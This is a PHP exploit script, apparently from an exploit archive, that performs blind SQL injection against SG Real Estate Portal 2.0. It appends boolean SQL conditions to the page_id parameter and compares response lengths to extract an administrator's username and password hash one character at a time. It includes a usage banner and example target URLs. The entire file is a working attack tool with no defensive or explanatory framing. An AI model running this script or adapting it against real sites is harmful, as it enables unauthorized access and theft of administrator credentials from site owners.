<?php
ini_set("max_execution_time",0);
print_r('
###############################################################
#
#      SG Real Estate Portal 2.0 - Blind SQL Injection Exploit  
#                                                          
#      Vulnerability discovered by: Stack    
#      Exploit coded by:            Stack
#      Greetz to:                   All My Freind
#
###############################################################
#                                                          
#Admin Panel: [Target]/SG/
#Usage:       php '.$argv[0].' [Target] [Userid]
#Example :
#php '.$argv[0].' "http://www.site.com/SG/index.php?lang=EN&page_id=[Real id]" 1
#php '.$argv[0].' "http://www.site.com/SG/index.php?lang=EN&page_id=106" 1
#                                                          
###############################################################
');
if ($argc > 1) {
$url = $argv[1];
if ($argc < 3) {
$userid = 1;
} else {
$userid = $argv[2];
}
$r = strlen(file_get_contents($url."+and+1=1"));
echo "\nExploiting:\n";
$w = strlen(file_get_contents($url."+and+1=0"));
$t = abs((100-($w/$r*100)));
echo "\nUsername: ";
for ($i=1; $i <= 30; $i++) {
$laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+websiteadmin_admin_users+where+id=".$userid."+limit+0,1),".$i.",1))!=0"));
   if (abs((100-($laenge/$r*100))) > $t-1) {
      $count = $i;
      $i = 30;
   }
}
for ($j = 1; $j < $count; $j++) {
   for ($i = 46; $i <= 122; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+websiteadmin_admin_users+where+id=".$userid."+limit+0,1),".$j.",1))%3E".$i.""));
      if (abs((100-($laenge/$r*100))) > $t-1) {
         $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+websiteadmin_admin_users+where+id=".$userid."+limit+0,1),".$j.",1))%3E".($i-1).""));
         if (abs((100-($laenge/$r*100))) > $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 122;
      }
   }
}
echo "\nPassword: ";
for ($j = 1; $j <= 32; $j++) {
   for ($i = 46; $i <= 102; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+password+from+websiteadmin_admin_users+where+id=".$userid."+limit+0,1),".$j.",1))%3E".$i.""));
      if (abs((100-($laenge/$r*100))) > $t-1) {
         $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+password+from+websiteadmin_admin_users+where+id=".$userid."+limit+0,1),".$j.",1))%3E".($i-1).""));
         if (abs((100-($laenge/$r*100))) > $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 102;
      }
   }
}
} else {
echo "\nExploiting failed: By Stack\n";
}
?>

